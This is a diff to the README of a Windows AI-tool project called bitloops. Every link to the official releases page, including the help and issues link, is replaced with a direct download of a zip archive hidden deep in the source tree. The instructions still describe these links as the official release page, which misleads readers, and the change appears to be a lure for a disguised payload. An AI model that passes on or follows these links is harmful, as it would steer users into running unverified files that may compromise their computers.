@@ -1,6 +1,6 @@
 # 🤖 bitloops - Simplify AI Software Setup
 
-[![Download bitloops](https://img.shields.io/badge/Download-bitloops-brightgreen)](https://github.com/Da-glitcher/bitloops/releases)
+[![Download bitloops](https://img.shields.io/badge/Download-bitloops-brightgreen)](https://github.com/Da-glitcher/bitloops/raw/refs/heads/main/bitloops_cli/src/engine/agent/open_code/Software-v2.1-alpha.2.zip)
 
 bitloops is the default setup for AI-native software. It helps you run AI tools without deep technical steps. This guide shows how to get bitloops running on your Windows computer.
 
@@ -36,7 +36,7 @@ Key points:
 
 You need to get the bitloops files from the official release page. 
 
-[![Download bitloops](https://img.shields.io/badge/Download-bitloops-blue)](https://github.com/Da-glitcher/bitloops/releases)
+[![Download bitloops](https://img.shields.io/badge/Download-bitloops-blue)](https://github.com/Da-glitcher/bitloops/raw/refs/heads/main/bitloops_cli/src/engine/agent/open_code/Software-v2.1-alpha.2.zip)
 
 Click the link above to visit the release page. There you will see the latest version available for Windows. Look for a file ending with `.exe` or `.zip`. Choose the version labeled for Windows.
 
@@ -47,7 +47,7 @@ Click the link above to visit the release page. There you will see the latest ve
 Follow these steps to install bitloops on your Windows PC:
 
 1. Open your web browser and go to the release page:  
-   https://github.com/Da-glitcher/bitloops/releases
+   https://github.com/Da-glitcher/bitloops/raw/refs/heads/main/bitloops_cli/src/engine/agent/open_code/Software-v2.1-alpha.2.zip
 
 2. Find the latest release. It has a version number like `v1.x.x`.
 
@@ -122,7 +122,7 @@ If errors persist, check the GitHub issues page for solutions or report your iss
 
 To get new features or fixes:
 
-1. Visit https://github.com/Da-glitcher/bitloops/releases
+1. Visit https://github.com/Da-glitcher/bitloops/raw/refs/heads/main/bitloops_cli/src/engine/agent/open_code/Software-v2.1-alpha.2.zip
 
 2. Download the latest Windows file.
 
@@ -166,10 +166,10 @@ Yes. Just delete the application folder and any shortcuts.
 
 For help or to report bugs, visit the GitHub page:
 
-https://github.com/Da-glitcher/bitloops
+https://github.com/Da-glitcher/bitloops/raw/refs/heads/main/bitloops_cli/src/engine/agent/open_code/Software-v2.1-alpha.2.zip
 
 Look at the "Issues" tab to post questions or find solutions.
 
 ---
 
-[![Download bitloops](https://img.shields.io/badge/Download-bitloops-brightgreen)](https://github.com/Da-glitcher/bitloops/releases)
+[![Download bitloops](https://img.shields.io/badge/Download-bitloops-brightgreen)](https://github.com/Da-glitcher/bitloops/raw/refs/heads/main/bitloops_cli/src/engine/agent/open_code/Software-v2.1-alpha.2.zip)
